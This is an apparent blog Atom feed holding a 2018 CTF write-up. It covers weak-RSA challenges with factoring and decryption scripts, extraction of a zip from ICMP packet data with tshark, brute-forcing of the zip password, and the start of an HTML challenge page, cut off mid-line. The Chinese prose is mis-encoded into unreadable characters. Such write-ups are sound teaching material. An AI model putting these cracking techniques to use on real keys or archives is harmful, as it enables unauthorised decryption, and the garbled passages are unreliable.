<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Èó≤Ë®ÄËØ≠</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findneo.github.io/"/>
  <updated>2019-01-25T23:21:37.216Z</updated>
  <id>https://findneo.github.io/</id>
  
  <author>
    <name>findneo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018 ÊüèÈπ≠ÊùØ writeup</title>
    <link href="https://findneo.github.io/181125-bailucup-writeup/"/>
    <id>https://findneo.github.io/181125-bailucup-writeup/</id>
    <published>2018-11-25T12:25:37.000Z</published>
    <updated>2019-01-25T23:21:37.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    num = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(num):</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">p = random.randint(<span class="number">1</span>&lt;&lt;<span class="number">3071</span>,<span class="number">1</span>&lt;&lt;<span class="number">3072</span>)</span><br><span class="line">p = next_prime(p)</span><br><span class="line">q = next_prime(p*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(bytes_to_long(flag),e,N)</span><br><span class="line"><span class="keyword">print</span> N<span class="comment">#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br></pre></td></tr></table></figure><h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line">c=<span class="number">152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">k=gmpy2.iroot(n//<span class="number">10</span>+<span class="number">1</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">print(k)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xfffffff</span>):</span><br><span class="line">    f=k-i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10000</span>==<span class="number">0</span>:</span><br><span class="line">        print(i,end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">if</span> n%f==<span class="number">0</span>:</span><br><span class="line">        print(i,n)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p=f</span><br><span class="line">q=n//f</span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378</span></span><br><span class="line"><span class="comment"># 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="comment"># b'ISEC&#123;simp13_crypt0&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h3><blockquote><p>Âü∫Âõ†‰ºöÁ™ÅÂèòÔºåBASE64‰∏éCaesar‰πüÂèòÂºÇ<br>Âä†ÂØÜÂØÜÊñá: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6=<br>‚Äã    Ê†ºÂºè: ISEC{ }</p></blockquote><p>ÊàëÂ•ΩÂÉè‰∏çÂ§™ÊáÇ‚ïÆ(‚ïØ‚ñΩ‚ï∞)‚ï≠</p><h3 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h3><h4 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSA(<span class="number">829467319</span>, <span class="number">48357</span>)</span><br><span class="line"><span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span></span><br></pre></td></tr></table></figure><h4 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = 'https://github.com/findneo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">829467319</span></span><br><span class="line"><span class="comment"># ‰ΩøÁî®yafuÁ¶ªÁ∫øÂàÜËß£ÂæóÂà∞p,q</span></span><br><span class="line">p = <span class="number">36497</span></span><br><span class="line">q = <span class="number">22727</span></span><br><span class="line">e=<span class="number">48357</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">c=[<span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span class="number">349705569</span>,<span class="number">388149253</span>,<span class="number">710690594</span>,<span class="number">763355610</span>,<span class="number">211593791</span>,<span class="number">707637171</span>,<span class="number">369453331</span>,<span class="number">228868281</span>,<span class="number">541631545</span>,<span class="number">397988536</span>,<span class="number">322517722</span>,<span class="number">12982396</span>,<span class="number">107590034</span>,<span class="number">387385119</span>,<span class="number">322517722</span>,<span class="number">685252839</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">109170298</span>,<span class="number">349705569</span>,<span class="number">763355610</span>,<span class="number">349705569</span>,<span class="number">349705569</span>,<span class="number">37195518</span>,<span class="number">25028382</span>,<span class="number">610867628</span>,<span class="number">44896265</span>,<span class="number">25028382</span>,<span class="number">454683367</span>,<span class="number">15283689</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> ci:chr(pow(ci,d,n)),c))</span><br><span class="line">print(s) <span class="comment"># _stIwn_:!oAestN_rii.ra__&#125;e_gt8nuae1nolg0iYf_2w&#123;_un_CeoeeEhychST</span></span><br></pre></td></tr></table></figure><p><img src="1543149985751.png" alt="1543149985751"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>ÈÉ®ÂàÜICMPÂåÖDATAÂ≠óÊÆµÊê∫Â∏¶Êï∞ÊçÆÔºå‰∏îÈÄêÂ≠óËäÇ‰∏∫504B‚Ä¶ÔºåÂæàÊòæÁÑ∂ÊòØ‰∏™ÂéãÁº©ÂåÖÔºå‰ΩøÁî®ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑tsharkÊèêÂèñÂØπÂ∫îÂ≠óÊÆµ„ÄÇ</p><p>tsharkÁî®Ê≥ïÂèÇËÄÉ<code>tshark --help</code> Êàñ <a href="https://www.cnblogs.com/liun1994/p/6142505.html" target="_blank" rel="noopener">WiresharkÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑tshark‰ΩøÁî®Â∞èËÆ∞</a> „ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r pcapng.pcapng  -Y <span class="string">"icmp and icmp.ident==0x930a"</span>  -T fields -e data | xxd -r -p &gt; flag.zip &amp;&amp; xxd flag.zip</span><br><span class="line">00000000: 504b 0304 1400 0100 0000 0386 584d 2a17  PK..........XM*.</span><br><span class="line">00000010: fbf2 3200 0000 2600 0000 0800 0000 666c  ..2...&amp;.......fl</span><br><span class="line">00000020: 6167 2e74 7874 c541 e340 943c a98d fc66  ag.txt.A.@.&lt;...f</span><br><span class="line">00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d  ........vG.4m=.=</span><br><span class="line">00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903  .L.-....r:.\^...</span><br><span class="line">00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400  d.&#123;[...LPK..?...</span><br><span class="line">00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000  ......XM*...2...</span><br><span class="line">00000070: 2600 0000 0800 2400 0000 0000 0000 2000  &amp;.....$....... .</span><br><span class="line">00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00  ......flag.txt..</span><br><span class="line">00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b   ...........|Gvk</span><br><span class="line">000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b  ..&#125;-.Bvk..&#125;-.Bvk</span><br><span class="line">000000b0: d401 504b 0506 0000 0000 0100 0100 5a00  ..PK..........Z.</span><br><span class="line">000000c0: 0000 5800 0000 0000 0050                 ..X......P</span><br><span class="line">neo@u:/mnt/d/cwd/bailu/mis1$</span><br></pre></td></tr></table></figure><p>‰ΩøÁî®ziperelloÁàÜÁ†¥ÂØÜÁ†Å‰∏∫qÔºåÂæóÂà∞<code>flag{d27ca49cb6f5583ae9f3bb2ec38190de}</code> „ÄÇ</p><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><h4 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>safe box<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">input &#123;</span></span><br><span class="line"><span class="undefined">  font-size: 200%;</span></span><br><span class="line"><span class="undefined">  margin-top: 5em;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 26em;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#result &#123;</span></span><br><span class="line"><span class="undefined">  margin-top: 8em;</span></span><br><span class="line"><span class="undefined">  font-size: 300%;</span></span><br><span class="line"><span class="undefined">  font-family: monospace;</span></span><br><span class="line"><span class="undefined">  font-weight: bold;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Granted";</span></span><br><span class="line"><span class="undefined">  color: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.denied&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Denied";</span></span><br><span class="line"><span class="undefined">  color: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#content &#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted #content &#123;</span></span><br><span class="line"><span class="undefined">  display: initial;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">@keyframes spin &#123;</span></span><br><span class="line"><span class="undefined">  from &#123; transform: rotateY(0); &#125;</span></span><br><span class="line"><span class="undefined">  to &#123; transform: rotateY(360deg); &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube &#123;</span></span><br><span class="line"><span class="undefined">  animation: spin 20s infinite linear;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube div &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  width: 200px;</span></span><br><span class="line"><span class="undefined">  height: 200px;</span></span><br><span class="line"><span class="undefined">  background: rgba(0, 0, 0, 0.51);</span></span><br><span class="line"><span class="undefined">  box-shadow: inset 0 0 60px white;</span></span><br><span class="line"><span class="undefined">  font-size: 20px;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  line-height: 200px;</span></span><br><span class="line"><span class="undefined">  color: rgba(0,0,0,0.5);</span></span><br><span class="line"><span class="undefined">  font-family: sans-serif;</span></span><br><span class="line"><span class="undefined">  text-transform: uppercase;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">adler32</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, L = str.length, M = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; L;) &#123;</span></span><br><span class="line"><span class="javascript">        M = <span class="built_in">Math</span>.min(L - i, <span class="number">3850</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (M &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">            c = str.charCodeAt(i++);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (c &lt; <span class="number">0x80</span>) &#123; a += c; &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">else</span> <span class="keyword">if</span> (c &lt; <span class="number">0x800</span>) &#123;</span></span><br><span class="line"><span class="undefined">                a += 192 | ((c &gt;&gt; 6) &amp; 31); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="number">0xD800</span> &amp;&amp; c &lt; <span class="number">0xE000</span>) &#123;</span></span><br><span class="line"><span class="undefined">                c = (c &amp; 1023) + 64; d = str.charCodeAt(i++) &amp; 1023;</span></span><br><span class="line"><span class="undefined">                a += 240 | ((c &gt;&gt; 8) &amp; 7); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 2) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((d &gt;&gt; 6) &amp; 15) | ((c &amp; 3) &lt;&lt; 4); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (d &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">                a += 224 | ((c &gt;&gt; 12) &amp; 15); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 6) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            b += a; --M;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        a = (15 * (a &gt;&gt;&gt; 16) + (a &amp; 65535));</span></span><br><span class="line"><span class="undefined">        b = (15 * (b &gt;&gt;&gt; 16) + (b &amp; 65535));</span></span><br><span class="line"><span 